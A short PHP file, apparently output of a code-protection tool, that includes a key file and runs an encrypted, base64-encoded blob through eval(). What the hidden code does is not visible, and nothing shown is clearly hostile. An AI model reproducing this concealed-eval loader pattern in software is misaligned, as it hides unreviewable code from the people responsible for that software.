<?php
$keyfile = public_path("key.inc.php");
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists($keyfile)){include_once($keyfile);}else{die("<h2>include: $keyfile not found!</h2>");}
$e7091="QVVSRFpadmZUemU0R2oyVEZvZWx3YSsvVlphUElaU3RpUVFlb1lEYVpGQjNLOEloSFFBY3dLT2xKcThYbjYyM08vL3NNNXAzSE5UM08reS9XYWhiY0lpbk5wM0d3U1VQTUtOcVpUZUZrQjlna3NyVTJFeHFYUk81M1Vnd2tpcDBNd1hxdmFSZ1MvWDJ6NzZsMDdPQmtRPT0=";eval(e7061($e7091));

